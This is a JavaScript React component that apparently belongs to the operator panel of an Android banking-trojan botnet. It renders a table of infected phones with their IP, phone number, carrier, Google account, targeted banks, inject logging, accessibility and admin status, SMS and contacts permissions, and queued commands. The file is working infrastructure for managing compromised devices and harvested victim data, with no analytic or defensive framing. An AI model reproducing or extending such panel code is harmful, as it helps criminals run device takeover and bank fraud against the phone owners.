import React from 'react';
import BotsRow from './BotsRow';
import { try_eval } from '../../serviceF';

class BotsTbody extends React.Component {
    
    constructor(props) {
        super(props);
    }
    
    componentDidMount() {
        try_eval('UpdateToolTips()');
    }
    
    
    componentDidUpdate(prevProps, prevState) {
        try_eval('UpdateToolTips()');
    }

    render () {
        return (
            <React.Fragment>
            <tbody>
                {this.props.botList.map(item => (
                    <BotsRow
                        BotListForceUpdate={
                        this.props.BotListForceUpdate}
                        WaitCommand={item.CS}
                        botIp={item.IP}
                        botId={item.ID}
                        botAndroidVersion={item.AD}
                        botTagsList={item.TG}
                        botCountry={item.CY}
                        botBanks={item.BS}
                        statProtect={item.SP}
                        statScreen={item.SS}
                        statAccessibility={item.SA}
                        comment={new Buffer(item.CT == null ? '' : item.CT, 'base64').toString('utf-8')}
                        statAdmin={item.SN}
                        botLastActivity={item.LC}
                        botAddDate={item.DI}
                        operator={item.OR}
                        model={item.ML}
                        phoneNumber={item.PH}
                        step={item.step}
                        isLogsInjects={item.LI}
                        perms_storage={item.PS}
                        perms_sms={item.PC}
                        perms_phone_state={item.PP}
                        perms_contacts={item.PO}
                        statSMS={item.SC}
                        google_account={item.GA}
                    />
                ))}
            </tbody>
            </React.Fragment>
        );
    }
}

export default BotsTbody;